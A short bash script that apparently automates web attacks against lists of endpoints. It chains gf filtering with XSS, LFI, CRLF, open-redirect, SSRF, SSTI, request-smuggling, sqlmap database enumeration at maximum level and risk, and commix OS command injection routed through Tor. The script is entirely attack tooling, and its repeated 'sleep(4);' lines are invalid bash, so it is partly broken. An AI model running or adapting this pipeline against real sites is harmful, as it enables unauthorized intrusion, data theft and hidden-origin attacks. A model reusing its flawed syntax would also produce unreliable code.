#!/bin/bash
# Need to change the SSRF tool

# Filter Endpoints based on gf 
cat Endpoints.txt | gf xss | anew XSS.txt;
cat Endpoints.txt | gf lfi | anew LFI.txt;
cat Endpoints.txt | gf ssrf | anew SSRF.txt;
cat Endpoints.txt | gf ssti | anew SSTI.txt;
cat Endpoints.txt | gf rce | anew OS_Commands.txt;
cat Endpoints.txt | gf sqli | anew SQL.txt;

# head injection for 403&401
cat httpx.txt | grep "403" | anew 403.txt
cat httpx.txt | grep "401" | anew 403.txt
cat 403.txt | while read url; do headi -u $url -p internal_CLoudEnum_IPs.txt | anew 403_Response.txt ; done
 
# XSS automation
dalfox file XSS.txt -o XSS_Inject_Response.txt;
sleep(4);

# LFI automation

# cat LFI.txt | qsreplace FUZZ | while read url; do
# ffuf -u $url -t 25 -mr "root:x" -w payloads_wordlist.txt -o LFI_Inject_Response.txt | anew LFI_new_Response.txt
# done

cd liffy
cat LFI.txt | while read url; do python3 liffy.py $url -d -i -e -f | anew ../LFI_new_Response.txt; done
cd ../
sleep(4);

# CRLF injection
crlfuzz -l ALLWithout404.txt -c 20 | anew CRLF_Inject_Response.txt

# Open Redirect
cd Oralyzer
python3 oralyzer.py -l SSRF.txt | anew ../Open_Redirect_Response.txt
cd ../
sleep(4);

# SSRF automation
cat SSRF.txt | qsreplace "Burp collaborator payload" | while read url; do httpx -u $url --status-code -o SSRF_Inject_Response.txt | anew SSRF_Inject_anew_Response.txt; done
sleep(4);

# SSTI injection
cd tplmap
cat SSTI.txt | while read url; do python3 tplmap.py -u $url | anew ../SSTI_Inject_Response.txt; done
cd ../
sleep(4);

# Smuggler injection
cd smuggler
cat ALLWithout404.txt | python3 smuggler.py | anew Smuggler_Response.txt
cd ../
sleep(4);

# SQL automation
sqlmap -m SQL.txt --level 5 --risk 3 --batch --dbs --tamper=between | anew SQL_Inject_Response.txt;
sleep(4);


# OS command injection
cd commix
cat OS_Commands.txt | while read url; do python3 commix.py -u $url --tor --hostname | anew ../Command_Inject_Response.txt; done

